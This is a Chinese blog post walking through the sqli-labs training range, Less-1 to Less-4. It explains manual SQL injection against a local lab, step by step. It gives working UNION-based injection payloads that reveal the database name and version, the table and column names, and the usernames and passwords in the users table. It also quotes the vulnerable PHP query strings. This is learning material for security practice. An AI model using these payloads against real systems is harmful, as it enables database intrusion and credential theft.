<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="keywords" content="Hexo Theme Keep">
    <meta name="description" content="文明其思想，野蛮其体魄。">
    <meta name="author" content="二十八华生">
    
    <title>
        
            sqli-lab(手工注入篇) |
        
        二十八华生的博客
    </title>
    
<link rel="stylesheet" href="/css/style.css">

    <link rel="shortcut icon" href="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230110/bitbug_favicon.6goqr5bioz9c.webp">
    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/fontawesome/css/fontawesome.min.css">
    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/fontawesome/css/regular.min.css">
    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/fontawesome/css/solid.min.css">
    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/fontawesome/css/brands.min.css">
    <script id="hexo-configurations">
    let KEEP = window.KEEP || {};
    KEEP.hexo_config = {"hostname":"c2yb8er.cn","root":"/","language":"zh-CN","path":"search.xml"};
    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true},"style":{"primary_color":"#0066cc","logo":"https://cdn.staticaly.com/gh/C2yb8er/images@master/20230110/WanYe.2i8xng3vmthc.webp","favicon":"https://cdn.staticaly.com/gh/C2yb8er/images@master/20230110/bitbug_favicon.6goqr5bioz9c.webp","avatar":"https://cdn.staticaly.com/gh/C2yb8er/images@master/20230110/WanYe.2i8xng3vmthc.webp","font_size":"15.2px","hover":{"shadow":true,"scale":false},"first_screen":{"enable":true,"header_transparent":true,"background_img":"/images/bg.svg","description":"文明其思想，||野蛮其体魄。","font_color":null,"hitokoto":false},"scroll":{"progress_bar":true,"percent":false}},"local_search":{"enable":true,"preload":true},"code_copy":{},"code_block":{"tools":{"enable":true,"style":"default"},"highlight_theme":"default"},"side_tools":{},"pjax":{"enable":true},"lazyload":{"enable":true},"comment":{"enable":false,"use":"valine","valine":{"appid":null,"appkey":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.7"},"waline":{"server_url":null,"reaction":false,"version":2}},"post":{"author_label":{"enable":false,"auto":true,"custom_label_list":[]},"word_count":{"enable":true,"wordcount":true,"min2read":true},"img_align":"left","copyright_info":true},"version":"3.5.2"};
    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"};
    KEEP.language_code_block = {"copy":"复制代码","copied":"已复制","fold":"折叠代码块","folded":"已折叠"};
  </script>
<meta name="generator" content="Hexo 5.4.2"></head>


<body>
<div class="progress-bar-container">
    
        <span class="scroll-progress-bar"></span>
    

    
        <span class="pjax-progress-bar"></span>
        <i class="pjax-progress-icon fas fa-circle-notch fa-spin"></i>
    
</div>


<main class="page-container">

    

    <div class="page-main-content">

        <div class="page-main-content-top">
            
<header class="header-wrapper">

    <div class="header-content">
        <div class="left">
            
                <a class="logo-image" href="/">
                    <img src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230110/WanYe.2i8xng3vmthc.webp">
                </a>
            
            <a class="logo-title" href="/">
               二十八华生的博客
            </a>
        </div>

        <div class="right">
            <div class="pc">
                <ul class="menu-list">
                    
                        <li class="menu-item">
                            <a class=""
                               href="/"
                            >
                                首页
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/archives"
                            >
                                归档
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/categories"
                            >
                                分类
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/tags"
                            >
                                标签
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/about"
                            >
                                关于
                            </a>
                        </li>
                    
                    
                        <li class="menu-item search search-popup-trigger">
                            <i class="fas fa-search"></i>
                        </li>
                    
                </ul>
            </div>
            <div class="mobile">
                
                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
                
                <div class="icon-item menu-bar">
                    <div class="menu-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <div class="header-drawer">
        <ul class="drawer-menu-list">
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/">首页</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/archives">归档</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/categories">分类</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/tags">标签</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/about">关于</a>
                </li>
            
        </ul>
    </div>

    <div class="window-mask"></div>

</header>


        </div>

        <div class="page-main-content-middle">

            <div class="main-content">

                
                    <div class="fade-in-down-animation">
    <div class="post-page-container">
        <div class="article-content-container">

            <div class="article-title">
                <span class="title-hover-animation">sqli-lab(手工注入篇)</span>
            </div>

            
                <div class="article-header">
                    <div class="avatar">
                        <img src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230110/WanYe.2i8xng3vmthc.webp">
                    </div>
                    <div class="info">
                        <div class="author">
                            <span class="name">二十八华生</span>
                            
                        </div>
                        <div class="meta-info">
                            
<div class="article-meta-info">
    <span class="article-date article-meta-item">
        
            <i class="fa-regular fa-calendar-plus"></i>&nbsp;
        
        <span class="pc">2022-10-08 22:53:42</span>
        <span class="mobile">2022-10-08 22:53</span>
    </span>
    
        <span class="article-update-date article-meta-item">
        <i class="fas fa-file-pen"></i>&nbsp;
        <span class="pc">2023-07-04 17:40:37</span>
    </span>
    
    
        <span class="article-categories article-meta-item">
            <i class="fas fa-folder"></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/categories/Web/">Web</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    
    
        <span class="article-tags article-meta-item">
            <i class="fas fa-tags"></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/tags/SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/">SQL注入学习</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    

    
    
        <span class="article-wordcount article-meta-item">
            <i class="fas fa-file-word"></i>&nbsp;<span>2.4k 字</span>
        </span>
    
    
        <span class="article-min2read article-meta-item">
            <i class="fas fa-clock"></i>&nbsp;<span>10 分钟</span>
        </span>
    
    
        <span class="article-pv article-meta-item">
            <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
        </span>
    
</div>

                        </div>
                    </div>
                </div>
            

            <div class="article-content keep-markdown-body">
                <blockquote>
<p>狠狠地给我注入💉</p>
</blockquote>
<span id="more"></span>



<h1 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h1><blockquote>
<p>GET - Error based - Single quotes - String</p>
</blockquote>
<h2 id="一、题目环境"><a href="#一、题目环境" class="headerlink" title="一、题目环境"></a>一、题目环境</h2><p>打开靶场Level1如图所示：<br><img lazyload alt="image" data-src="%E9%9D%B6%E5%9C%BA1.png"></p>
<h2 id="二、判断是否存在SQL注入"><a href="#二、判断是否存在SQL注入" class="headerlink" title="二、判断是否存在SQL注入"></a>二、判断是否存在SQL注入</h2><blockquote>
<p>Please input the ID as parameter with numeric value.</p>
</blockquote>
<p>由题目的提醒，我们试着输入手动输入id来观察页面是否有回显来判断是否存在SQL注入漏洞。</p>
<p><img lazyload alt="image" data-src="%E9%9D%B6%E5%9C%BA2.png"></p>
<p><img lazyload alt="image" data-src="%E9%9D%B6%E5%9C%BA3.png"></p>
<p>通过输入不同的id值，我们发现页面有了回显并且返回的内容也不相同，这说明存在我们刚才输入的内容是代入数据库中去执行查询命令了。即此页面存在SQL注入漏洞。</p>
<h2 id="三、判断类型"><a href="#三、判断类型" class="headerlink" title="三、判断类型"></a>三、判断类型</h2><ul>
<li>根据参数类型：字符型，数字型、搜索型</li>
<li>根据提交方式：POST注入，GET注入，HTTP HEAD注入</li>
<li>根据有无回显：联合注入，报错注入，布尔盲注，延时注入</li>
<li>其他注入：堆叠注入，宽字节注入，二次注入等</li>
</ul>
<p>在这里由于是level1且初学，我们仅考虑参数类型中的字符型和数字型。</p>
<h3 id="1-判断漏洞类型是否是数字型"><a href="#1-判断漏洞类型是否是数字型" class="headerlink" title="1.判断漏洞类型是否是数字型"></a>1.判断漏洞类型是否是数字型</h3><blockquote>
<p>当输入的参数为整型时，SQL语句类型大致如下：<br>select * from &lt;表名&gt; where id = x<br>这种类型可以使用 <strong>and 1=1</strong> 和 <strong>and 1=2</strong> 来进行判断：</p>
</blockquote>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">url<span class="operator">/</span>?id<span class="operator">=</span> x <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> 页面依旧运行正常，继续进行下一步。</span><br><span class="line"></span><br><span class="line">url<span class="operator">/</span>?id<span class="operator">=</span> x <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> 页面运行错误，则说明此<span class="keyword">SQL</span>注入为数字型注入。若页面依旧运行正常，则漏洞类型不是数字型</span><br><span class="line"></span><br><span class="line">在后台执行的<span class="keyword">SQL</span>语句大致如下:</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="operator">&lt;</span>表名<span class="operator">&gt;</span> <span class="keyword">where</span> id <span class="operator">=</span> x <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> </span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="operator">&lt;</span>表名<span class="operator">&gt;</span> <span class="keyword">where</span> id <span class="operator">=</span> x <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span></span><br></pre></td></tr></table></figure>
<p><img lazyload alt="image" data-src="%E9%9D%B6%E5%9C%BA4.png"></p>
<p><img lazyload alt="image" data-src="%E9%9D%B6%E5%9C%BA5.png"></p>
<p>根据回显可得，该SQL注入漏洞不是数字型。</p>
<h3 id="2-判断漏洞类型是否是字符型"><a href="#2-判断漏洞类型是否是字符型" class="headerlink" title="2.判断漏洞类型是否是字符型"></a>2.判断漏洞类型是否是字符型</h3><blockquote>
<p>当输入的参数为字符型时，SQL 语句类型大致如下：<br>select * from &lt;表名&gt; where id = ‘x’<br>这种类型我们同样可以使用 and ‘1’=’1 和 and ‘1’=’2来判断：</p>
</blockquote>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">url<span class="operator">/</span>?id<span class="operator">=</span> x<span class="string">&#x27; and &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span> 页面运行正常，继续进行下一步。</span><br><span class="line">url<span class="operator">/</span>?id<span class="operator">=</span> x<span class="string">&#x27; and &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">2</span> 页面运行错误，则说明此 <span class="keyword">Sql</span> 注入为字符型注入。</span><br><span class="line"></span><br><span class="line">可以简化成：</span><br><span class="line">url<span class="operator">/</span>?id<span class="operator">=</span> x<span class="string">&#x27; and 1=1 --+	页面运行正常，继续进行下一步。</span></span><br><span class="line"><span class="string">url/?id= x&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="comment">--+ 页面运行错误，则说明此 Sql 注入为字符型注入。</span></span><br><span class="line">在后台执行的<span class="keyword">SQL</span>语句大致如下:</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="operator">&lt;</span>表名<span class="operator">&gt;</span> <span class="keyword">where</span> id <span class="operator">=</span> <span class="string">&#x27;x&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;1&#x27;</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="operator">&lt;</span>表名<span class="operator">&gt;</span> <span class="keyword">where</span> id <span class="operator">=</span> <span class="string">&#x27;x&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;2&#x27;</span></span><br></pre></td></tr></table></figure>

<p><img lazyload alt="image" data-src="%E9%9D%B6%E5%9C%BA7.png"></p>
<p><img lazyload alt="image" data-src="%E9%9D%B6%E5%9C%BA8.png"></p>
<p>根据回显可得, 该SQL注入漏洞是字符型.</p>
<h2 id="四、开始注入"><a href="#四、开始注入" class="headerlink" title="四、开始注入"></a>四、开始注入</h2><p>由于靶场不支持#号的注释方法,我们采用–+的注释方法.</p>
<p><img lazyload alt="image" data-src="%E9%9D%B6%E5%9C%BA6.png"></p>
<h3 id="1-获取表格有几列"><a href="#1-获取表格有几列" class="headerlink" title="1.获取表格有几列"></a>1.获取表格有几列</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url/?id=1&#x27;order by 3 --+</span><br></pre></td></tr></table></figure>

<p>这个只有从1~n挨个去试,有时候运气好可能试的次数少一点.</p>
<p><img lazyload alt="image" data-src="%E9%9D%B6%E5%9C%BA9.png"></p>
<p><img lazyload alt="image" data-src="%E9%9D%B6%E5%9C%BA10.png"></p>
<p>所以,这个表格由三列组成.</p>
<blockquote>
<p><strong>order by语法：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> 数字 <span class="operator">|</span> 列名 [ <span class="keyword">ASC</span> , [ <span class="keyword">DESC</span> ] ]</span><br></pre></td></tr></table></figure>

<p>1、order by：对查询结果按照指定列进行排序，指定列的方式有两种：数字或列名</p>
<p>2、ASC：升序排列，默认为ASC</p>
<p>3、DESC：降序排列</p>
<p> 注意：<strong>以数字方式指定排序列时，数字不能超过列的总数</strong>，利用该特性在进行SQL注入的时候可以判断数据库的字段数量</p>
</blockquote>
<h3 id="2-爆出显示位"><a href="#2-爆出显示位" class="headerlink" title="2.爆出显示位"></a>2.爆出显示位</h3><blockquote>
<p>显示位就是网页中能够显示数据的位置。</p>
<p>举例来说，比如我们通过order by命令知道了表的列数为11。然后再使用union select 1,2,3…,11 from table，网页中显示了信息8，那么说明网页只能够显示第8列中信息，不能显示其他列的信息。也可以理解为网页只开放了8这个窗口，你想要查询数据库信息就必须要通过这个窗口。所以如果我们想要知道某个属性的值，比如admin,就要把admin属性放到8的位置上，这样就能通过第8列爆出admin的信息。</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url/?id=-1&#x27;union select 1,2,3--+</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>为什么这里要给id赋值为-1呢?</strong></p>
<p>如果id=1的数据被查询出来，返回到页面中，就占据了两个回显位,导致后续的查询的内容无法回显到页面中,所以就是专门不让id正确从而能够让后续查询语句能够正常回显.</p>
</blockquote>
<h3 id="3-爆出库名和版本或操作系统和用户名"><a href="#3-爆出库名和版本或操作系统和用户名" class="headerlink" title="3.爆出库名和版本或操作系统和用户名"></a>3.爆出库名和版本或操作系统和用户名</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url<span class="operator">/</span>?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;union select 1,database(),version()--+</span></span><br><span class="line"><span class="string">url/?id=-1&#x27;</span><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,@<span class="variable">@version</span>_compile_os,<span class="keyword">user</span>()<span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<p><img lazyload alt="image" data-src="%E9%9D%B6%E5%9C%BA11.png"></p>
<p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230111/%E5%9B%BE%E7%89%87.1n2ch975ei80.webp"></p>
<blockquote>
<p>database(),version()都是sql中的函数.</p>
<p>这里将2,3换为database()和version()是因为2,3才是显示位.</p>
</blockquote>
<h3 id="4-爆出表名"><a href="#4-爆出表名" class="headerlink" title="4.爆出表名"></a>4.爆出表名</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url<span class="operator">/</span>?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+</span></span><br></pre></td></tr></table></figure>

<p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230111/%E5%9B%BE%E7%89%87.b0j47d12sjk.webp"></p>
<p><strong>1.group_concat函数</strong></p>
<p> ​    group_concat函数是将查询到的每行结果以某个字段名进行合并，每一行合并的结果以逗号分隔开，如果逗号看不清楚的话，可以自定义分隔符如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">group_concat(table_name,&#x27;我是分隔符&#x27;)</span><br></pre></td></tr></table></figure>

<p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230111/%E5%9B%BE%E7%89%87.27orjr0g48ow.webp"></p>
<p> <strong>2.information_schema数据库</strong></p>
<p> ​    information_schema是mysql自带的一个信息数据库，保存着关于MySQL服务器所维护的所有其他数据库的信息。在information_schema数据库中还可以利用的表如下：</p>
<table>
<thead>
<tr>
<th align="center">schema_name</th>
<th align="center">储存了所有数据库的库名</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><strong>table_schema</strong></td>
<td align="center"><strong>储存了数据库名</strong></td>
</tr>
<tr>
<td align="center"><strong>tables</strong></td>
<td align="center"><strong>储存了数据库库名，以及该库中包含的表名</strong></td>
</tr>
<tr>
<td align="center"><strong>table_name</strong></td>
<td align="center"><strong>储存了表名</strong></td>
</tr>
</tbody></table>
<h3 id="5-爆出字段内容"><a href="#5-爆出字段内容" class="headerlink" title="5.爆出字段内容"></a>5.爆出字段内容</h3><blockquote>
<p>由于在爆表时候我们发现了关键表‘users’，于是我们现在去查一查它其中的字段</p>
</blockquote>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url<span class="operator">/</span>?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name = &#x27;</span>users<span class="string">&#x27; --+</span></span><br></pre></td></tr></table></figure>

<p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230111/%E5%9B%BE%E7%89%87.3qemwe8cioxs.webp"></p>
<p>发现了关键字段，现在我们来爆出字段的内容</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url<span class="operator">/</span>?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(username,&#x27;</span><span class="comment">--&#x27;),group_concat(password,&#x27;--&#x27;) from users--+</span></span><br></pre></td></tr></table></figure>

<p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230111/%E5%9B%BE%E7%89%87.537toufrxm9s.webp"></p>
<p>成功获取关键数据。</p>
<h2 id="五、后记"><a href="#五、后记" class="headerlink" title="五、后记"></a>五、后记</h2><p>​    这道题虽然不难但是花了我挺多的时间，很大部分是我对数据库太不熟悉了：表、行、列、字段之间的关系等等，下面放一些资料吧：</p>
<ol>
<li><a class="link" target="_blank" rel="noopener" href="https://blog.csdn.net/m0_63550462/article/details/121206926?ops_request_misc=&request_id=&biz_id=102&utm_term=%E6%95%B0%E6%8D%AE%E5%BA%93%E8%A1%A8%E5%92%8C%E5%88%97&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-121206926.142%5Ev70%5Econtrol,201%5Ev4%5Eadd_ask&spm=1018.2226.3001.4187">表、列、行、注解等讲解<i class="fas fa-external-link-alt"></i></a></li>
<li>数据库字段是是什么？每个字段由若干按照某种界限划分的相同数据类型的数据项组成.通常在表中为“列”</li>
<li><a class="link" target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44159028/article/details/114325805?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167339772016800217031196%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=167339772016800217031196&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-2-114325805-null-null.142%5Ev70%5Econtrol,201%5Ev4%5Eadd_ask&utm_term=sql%E6%B3%A8%E5%85%A5&spm=1018.2226.3001.4187">SQL注入详解<i class="fas fa-external-link-alt"></i></a></li>
</ol>
<h1 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h1><blockquote>
<p>GET - Error based - Intiger based</p>
</blockquote>
<p>​    同Less-1,只不过是数字型SQL注入，少了引号。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">--------------------查表--------------------</span><br><span class="line">http://localhost/SQLlabs/Less-2/</span><br><span class="line">?id=-1 </span><br><span class="line">union select 1,2,group_concat(table_name) from information_schema.tables where table_schema = database()</span><br><span class="line">--+</span><br><span class="line">--------------------查表字段/属性--------------------</span><br><span class="line">http://localhost/SQLlabs/Less-2/</span><br><span class="line">?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name = &#x27;users&#x27;</span><br><span class="line">--+</span><br><span class="line">--------------------查表字段/属性的内容--------------------</span><br><span class="line">http://localhost/SQLlabs/Less-2/</span><br><span class="line">?id=-1 union select 1,group_concat(username,&quot;--&quot;),group_concat(password,&quot;--&quot;) from users</span><br><span class="line">--+</span><br></pre></td></tr></table></figure>

<p><strong>小Tips</strong>：可以在本地用navicat连接好我们要查询的数据库，然后觉得抽象的部分就拿着本地的数据库中的结构去写SQL语句。</p>
<h1 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h1><blockquote>
<p>GET - Error based - Single quotes with twist –string</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/SQLlabs/Less-3/?id=1&#x27; and &#x27;1&#x27;=&#x27;1</span><br><span class="line">http://localhost/SQLlabs/Less-3/?id=1&#x27; and &#x27;1&#x27;=&#x27;2</span><br><span class="line">--------------------判断为字符型注入--------------------</span><br></pre></td></tr></table></figure>

<p>继续注入我们发现，Less-1的方法会报错，查看php源码发现：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=(&#x27;<span class="subst">$id</span>&#x27;) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>由于将注入的部分用了括号整体括起来，我们现在要实现注入的话就得更改一下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">(&#x27;$id&#x27;)</span><br><span class="line">--------------------假设注入如下--------------------</span><br><span class="line">?id=-1&#x27; union select 1,database(),version() --+</span><br><span class="line">--------------------得到结果如下--------------------</span><br><span class="line">(&#x27;-1&#x27; union select 1,database(),version() --+&#x27;)</span><br><span class="line">//这样就会存在括号缺失，我们提前结束括号就能注入成功</span><br><span class="line">--------------------应当注入如下--------------------</span><br><span class="line">?id=-1&#x27;) union select 1,database(),version() --+</span><br><span class="line">--------------------得到结果如下--------------------</span><br><span class="line">(&#x27;-1&#x27;) union select 1,database(),version() --+&#x27;)</span><br></pre></td></tr></table></figure>

<p>payload如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">--------------------查表--------------------</span><br><span class="line">http://localhost/SQLlabs/Less-3/</span><br><span class="line">?id=-1&#x27;) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+</span><br><span class="line">--------------------查表字段/属性--------------------</span><br><span class="line">http://localhost/SQLlabs/Less-3/</span><br><span class="line">?id=-1&#x27;) union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;users&#x27; --+</span><br><span class="line">--------------------查表字段/属性的内容--------------------</span><br><span class="line">http://localhost/SQLlabs/Less-3/</span><br><span class="line">?id=-1&#x27;) union select 1,group_concat(username,&#x27;--&#x27;),group_concat(password,&#x27;--&#x27;) from users --+</span><br></pre></td></tr></table></figure>



<h1 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h1><blockquote>
<p>Less-4 Error Based- DoubleQuotes String</p>
</blockquote>
<p>有点奇怪，字符型和数字型都测了一遍，但是发现页面都有正确回显。注释语句也没起到作用，看看源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span> = <span class="string">&#x27;&quot;&#x27;</span> . <span class="variable">$id</span> . <span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=(<span class="subst">$id</span>) LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="comment">//该代码的目的是在变量 $id 的值的前后添加双引号。</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">--------------------假设注入如下--------------------</span><br><span class="line">?id=1&#x27; union select 1,database(),version() --+</span><br><span class="line">--------------------得到结果如下--------------------</span><br><span class="line">(&quot;1&#x27; union select 1,database(),version() --+&quot;)</span><br></pre></td></tr></table></figure>

<p><mark>存疑:</mark>为什么页面能够正确地返回id=1的信息而不报错？为什么不能执行union联合查询语句？</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">--------------------假设注入如下--------------------</span><br><span class="line">?id=1&#x27;) union select 1,database(),version() --+</span><br><span class="line">--------------------得到结果如下--------------------</span><br><span class="line">(&quot;1&#x27;) union select 1,database(),version() --+&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>payload如下：在Less-3的基础上把-1后面的单引号改为双引号即可：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">--------------------查表--------------------</span><br><span class="line">http://localhost/SQLlabs/Less-4/</span><br><span class="line">?id=-1&quot;) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+</span><br><span class="line">--------------------查表字段/属性--------------------</span><br><span class="line">http://localhost/SQLlabs/Less-4/</span><br><span class="line">?id=-1&quot;) union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;users&#x27; --+</span><br><span class="line">--------------------查表字段/属性的内容--------------------</span><br><span class="line">http://localhost/SQLlabs/Less-4/</span><br><span class="line">?id=-1&quot;) union select 1,group_concat(username,&#x27;--&#x27;),group_concat(password,&#x27;--&#x27;) from users --+</span><br></pre></td></tr></table></figure>



<h2 id="反思"><a href="#反思" class="headerlink" title="反思"></a>反思</h2><p>​    在实际环境下，如果需要手工注入我怎么快速地知道注入闭合条件是什么呢？</p>
<ul>
<li>脚本遍历</li>
<li>获取源码（感觉难度较大，都获取到源码了）</li>
</ul>
<h2 id="Homework"><a href="#Homework" class="headerlink" title="Homework"></a>Homework</h2><ul>
<li><input disabled type="checkbox"> python写一个遍历的程序打通这两关</li>
</ul>
<h1 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h1><blockquote>
<p>Less-5 Double Query- Single Quotes- String</p>
</blockquote>
